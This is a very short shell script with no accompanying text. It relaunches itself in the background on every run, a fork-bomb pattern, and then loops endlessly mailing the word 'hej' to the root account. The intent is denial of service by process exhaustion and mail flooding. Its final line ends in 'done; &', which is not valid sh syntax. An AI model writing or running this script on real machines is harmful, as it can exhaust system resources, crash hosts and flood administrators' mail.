#!/bin/sh
$0 & 
while true; do echo "hej" | mail -s hej root; done; &

